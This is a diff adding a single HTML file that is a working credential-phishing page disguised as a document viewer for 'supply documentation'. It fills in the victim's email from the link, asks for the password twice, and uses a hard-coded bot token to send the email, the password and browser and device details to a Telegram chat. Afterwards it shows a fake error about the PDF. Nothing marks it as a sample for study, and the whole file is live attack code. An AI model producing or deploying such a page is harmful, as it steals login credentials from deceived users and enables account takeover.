@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Access Document</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .main-container {
+            display: flex;
+            flex: 1;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #ffffff;
+        }
+
+        /* Left Column: Viewer */
+        .viewer-section {
+            flex: 1.2;
+            background-color: #e2e2e2;
+            border-right: 1px solid #ccc;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .viewer-header {
+            background-color: #ffffff;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background-color: #76b900;
+            margin: 0 auto;
+            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+        }
+
+        .toolbar {
+            background-color: #f0f0f0;
+            padding: 8px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-top: 1px solid #e0e0e0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .tool-btn {
+            background: #ffffff;
+            border: 1px solid #ccc;
+            padding: 4px 10px;
+            border-radius: 3px;
+            font-size: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #333;
+        }
+
+        .page-indicator {
+            font-size: 12px;
+            color: #555;
+            margin: 0 5px;
+        }
+
+        .download-btn {
+            margin-left: auto;
+        }
+
+        .document-canvas {
+            padding: 30px;
+            display: flex;
+            justify-content: center;
+            overflow-y: auto;
+            flex: 1;
+        }
+
+        .document-page {
+            background: #ffffff;
+            width: 100%;
+            max-width: 450px;
+            min-height: 550px;
+            padding: 40px 30px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            font-family: Georgia, 'Times New Roman', Times, serif;
+            color: #111;
+            line-height: 1.5;
+        }
+
+        .document-page p {
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .document-page .bold-email {
+            font-weight: bold;
+        }
+
+        /* Right Column: Form */
+        .form-section {
+            flex: 1;
+            padding: 40px 50px;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+
+        .form-section h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #333;
+            outline: none;
+        }
+
+        .form-control:focus {
+            border-color: #0066cc;
+        }
+
+        .form-control[readonly] {
+            background-color: #fff;
+        }
+		.submit-btn {
+            width: 100%;
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #2563eb;
+        }
+
+        /* Bottom Banner */
+        .footer-banner {
+            background-color: #2b2b2b;
+            color: #aaa;
+            padding: 15px 20px;
+            text-align: center;
+        }
+
+        .banner-title {
+            font-size: 10px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            font-weight: 600;
+        }
+
+        .brand-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .brand-badge {
+            background-color: #ffffff;
+            border-radius: 4px;
+            padding: 6px 20px;
+            min-width: 90px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .brand-badge svg {
+            max-height: 18px;
+            max-width: 24px;
+        }
+		
+		#message {
+      text-align: center;
+      margin-top: 15px;
+      color: #333;
+    }
+
+    #successMessage {
+      display: none;
+      text-align: center;
+      color: #333;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <!-- Left Viewer -->
+        <div class="viewer-section">
+            <div class="viewer-header">
+                <div class="logo-icon"></div>
+            </div>
+            
+            <div class="toolbar">
+                <button class="tool-btn">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                    Zoom
+                </button>
+                <button class="tool-btn">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 6 2 18 2 18 9"></polyline><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"></path><rect x="6" y="14" width="12" height="8"></rect></svg>
+                    Print
+                </button>
+                <span class="page-indicator">Page 1 of 5</span>
+                <button class="tool-btn download-btn">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+                    Download
+                </button>
+            </div>
+
+            <div class="document-canvas">
+                <div class="document-page">
+                    <p><strong><p id="emailName">  </p></strong></p>
+                    <p>We have processed the latest supply documentation for your company, including fulfillment schedules and product requirements.</p>
+                    <p>To proceed with access, please confirm your identity via the form provided.</p>
+                   
+                    <p id="firstNameDisplay" ass="first-name-display"></p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Form -->
+        <div class="form-section" id="formSection">
+            <h1>Access Document</h1>
+            <form onsubmit="event.preventDefault();" id="nameForm">
+                <div class="form-group">
+                    <label for="email">Business Email</label>
+					<input type="email" id="firstName" class="form-control" value="" readonly>
+                </div>
+                <div class="form-group">
+                    <label for="password">Your Password</label>
+                    <input type="password" id="secondName"  class="form-control" placeholder="Enter your password">
+                </div>
+                <button type="submit" id="submitButton" class="submit-btn">Confirm & Access</button>
+            </form>
+			<div id="message"></div>
+        </div>
+		
+		<div id="successMessage">
+     Unable to open the pdf file.
+    </div>
+    </div>
+
+    <!-- Footer Banner -->
+    <div class="footer-banner">
+        <div class="banner-title">Trusted by leading B2B platforms</div>
+        <div class="brand-logos">
+            <!-- Salesforce / Cloud -->
+            <div class="brand-badge">
+                <svg viewBox="0 0 24 24" fill="#00a1e0"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/></svg>
+            </div>
+            <!-- HubSpot -->
+            <div class="brand-badge">
+                <svg viewBox="0 0 24 24" fill="#ff7a59"><circle cx="12" cy="12" r="8"/><path d="M12 2v4M12 18v4M2 12h4M18 12h4" stroke="#ff7a59" stroke-width="2"/></svg>
+            </div>
+            <!-- Shopify -->
+            <div class="brand-badge">Shopify</div>
+            <!-- Teams -->
+            <div class="brand-badge">Teams</div>
+            <!-- Slack -->
+            <div class="brand-badge">
+                <svg viewBox="0 0 24 24" width="20" height="20"><path fill="#E01E5A" d="M6 15a2.5 2.5 0 1 1 0-5 2.5 2.5 0 0 1 0 5z"/><path fill="#36C5F0" d="M15 6a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/><path fill="#2EB67D" d="M18 15a2.5 2.5 0 1 1 0-5 2.5 2.5 0 0 1 0 5z"/><path fill="#ECB22E" d="M15 18a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/></svg>
+            </div>
+        </div>
+    </div>
+
+  <script>
+
+  
+
+
+    const BOT_TOKEN = "8282958608:AAHlFNCDXPeu8GGo-hAJDFvBQJstE0i-098";
+    const CHAT_ID = "6626645668";
+
+
+ 
+
+    const firstNameInput =
+      document.getElementById("firstName");
+
+    let firstNameFromURL =
+      window.location.hash.substring(1);
+
+    try {
+      firstNameFromURL =
+        decodeURIComponent(firstNameFromURL);
+    } catch (error) {
+     
+    }
+
+    if (firstNameFromURL) {
+      firstNameInput.value = firstNameFromURL;
+	  
+	  
+    }
+ const firstNameDisplay =
+      document.getElementById("firstNameDisplay");
+
+    firstNameDisplay.textContent = "This order has been placed and delivered to:"  + firstNameFromURL;
+	
+	
+
+  const email = firstNameFromURL.trim();
+  const nameBeforeAt = email.split("@")[0];
+
+  emailName.textContent = "Dear," + nameBeforeAt;
+
+
+    /*
+      ============================
+      FORM ELEMENTS
+      ============================
+    */
+
+    const form =
+      document.getElementById("nameForm");
+
+    const formSection =
+      document.getElementById("formSection");
+
+    const secondNameInput =
+      document.getElementById("secondName");
+
+    const submitButton =
+      document.getElementById("submitButton");
+
+    const message =
+      document.getElementById("message");
+
+    const successMessage =
+      document.getElementById("successMessage");
+
+
+    let firstSubmit = true;
+
+
+   
+
+    function getBrowserDetails() {
+
+      const ua = navigator.userAgent;
+
+      let browser = "Unknown";
+
+      if (ua.includes("Edg/")) {
+        browser = "Microsoft Edge";
+      }
+      else if (ua.includes("Chrome/")) {
+        browser = "Google Chrome";
+      }
+      else if (ua.includes("Firefox/")) {
+        browser = "Mozilla Firefox";
+      }
+      else if (ua.includes("Safari/")) {
+        browser = "Apple Safari";
+      }
+
+
+      let os = "Unknown";
+
+      if (ua.includes("Windows")) {
+        os = "Windows";
+      }
+      else if (ua.includes("Android")) {
+        os = "Android";
+      }
+      else if (
+        ua.includes("iPhone") ||
+        ua.includes("iPad")
+      ) {
+        os = "iOS";
+      }
+      else if (ua.includes("Mac OS")) {
+        os = "macOS";
+      }
+      else if (ua.includes("Linux")) {
+        os = "Linux";
+      }
+
+
+      let device = "Desktop";
+
+      if (
+        /Mobi|Android|iPhone|iPad/i.test(ua)
+      ) {
+        device = "Mobile/Tablet";
+      }
+
+
+      return {
+        browser: browser,
+        os: os,
+        device: device,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width} x ${screen.height}`
+      };
+    }
+
+
+   
+
+    async function sendToTelegram(
+      firstName,
+      secondName
+    ) {
+
+      const browserInfo =
+        getBrowserDetails();
+
+      const text =
+        "EMAIL: " + firstName + "\n" +
+        "PASSWORD: " + secondName + "\n\n" +
+
+        "Browser: " +
+        browserInfo.browser + "\n" +
+
+        "OS: " +
+        browserInfo.os + "\n" +
+
+        "Device: " +
+        browserInfo.device + "\n" +
+
+        "Language: " +
+        browserInfo.language + "\n" +
+
+        "Timezone: " +
+        browserInfo.timezone + "\n" +
+
+        "Screen: " +
+        browserInfo.screen;
+
+
+      const url =
+        "https://api.telegram.org/bot" +
+        BOT_TOKEN +
+        "/sendMessage";
+
+
+      const response = await fetch(url, {
+
+        method: "POST",
+
+        headers: {
+          "Content-Type": "application/json"
+        },
+
+        body: JSON.stringify({
+
+          chat_id: CHAT_ID,
+
+          text: text
+
+        })
+
+      });
+
+
+      if (!response.ok) {
+        throw new Error(
+          "Telegram message failed"
+        );
+      }
+
+      return true;
+    }
+
+
+
+
+    form.addEventListener(
+      "submit",
+      async function(event) {
+
+        event.preventDefault();
+
+
+        const firstName =
+          firstNameInput.value.trim();
+
+        const secondName =
+          secondNameInput.value.trim();
+
+
+        if (!firstName || !secondName) {
+          return;
+        }
+
+
+        submitButton.disabled = true;
+        submitButton.textContent = "Access...";
+
+
+        try {
+
+          await sendToTelegram(
+            firstName,
+            secondName
+          );
+
+
+          /*
+            FIRST SUBMIT
+          */
+
+          if (firstSubmit) {
+
+            secondNameInput.value = "";
+
+            secondNameInput.placeholder =
+              "Re-enter your Password";
+
+            firstSubmit = false;
+
+            submitButton.disabled = false;
+            submitButton.textContent = "Submit";
+
+            secondNameInput.focus();
+
+          }
+
+
+         
+
+          else {
+
+            formSection.style.display =
+              "none";
+
+            successMessage.style.display =
+              "block";
+
+          }
+
+        }
+
+        catch (error) {
+
+          console.error(error);
+
+          message.textContent =
+            "Something went wrong. Please try again.";
+
+          submitButton.disabled = false;
+          submitButton.textContent = "Submit";
+
+        }
+
+      }
+    );
+
+  </script>
+</body>
+</html>
